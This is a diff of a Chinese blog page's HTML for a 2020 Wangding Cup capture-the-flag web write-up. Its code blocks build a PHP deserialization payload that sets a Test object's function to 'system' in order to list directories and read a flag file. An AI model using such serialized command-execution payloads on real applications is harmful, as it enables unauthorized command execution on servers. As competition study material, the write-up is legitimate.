@@ -57,7 +57,7 @@
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;05&#x2F;18&#x2F;%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-web&#x2F;2.jpg">
 <meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;05&#x2F;18&#x2F;%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-web&#x2F;3.jpg">
-<meta property="og:updated_time" content="2020-05-18T08:56:59.456Z">
+<meta property="og:updated_time" content="2020-05-18T11:41:35.604Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;05&#x2F;18&#x2F;%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-web&#x2F;2.jpg">
 
@@ -244,7 +244,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-05-18 10:05:40 / 修改时间：16:56:59" itemprop="dateCreated datePublished" datetime="2020-05-18T10:05:40+08:00">2020-05-18</time>
+              <time title="创建时间：2020-05-18 10:05:40 / 修改时间：19:41:35" itemprop="dateCreated datePublished" datetime="2020-05-18T10:05:40+08:00">2020-05-18</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -272,7 +272,7 @@
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">字数统计:</span>
-           <span class="post-count">631(字)</span>
+           <span class="post-count">638(字)</span>
            
          </span>
 	  
@@ -335,8 +335,10 @@
 <p>反序列化Test,利用call_user_func函数进行绕过，文件名匹配可以用反序列化绕过</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">var</span> $p = <span class="string">"Y-m-d h:i:s a"</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">var</span> $func = <span class="string">"date"</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> Test();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">$a -&gt; p=<span class="string">"ls ../../../../../"</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">$a -&gt; func = <span class="string">"system"</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">print_r(urlencode(serialize($a)));</span></pre></td></tr></table></figure>
 <p><img src="2.jpg" alt=""></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> Test();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$a -&gt; p=<span class="string">"cat /tmp/flagoefiu4r93"</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#$a -&gt; p="find / -name flag*";</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$a -&gt; func = <span class="string">"system"</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">print_r(urlencode(serialize($a)));</span></pre></td></tr></table></figure>
+
 <p><img src="3.jpg" alt=""></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> Test();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$a -&gt; p=<span class="string">"cat /tmp/flagoefiu4r93"</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$a -&gt; func = <span class="string">"system"</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">print_r(urlencode(serialize($a)));</span></pre></td></tr></table></figure>
+<p>```</p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/168093#h2-0" target="_blank" rel="noopener">PHP-escapeshell-命令执行</a></p>
 
     </div>
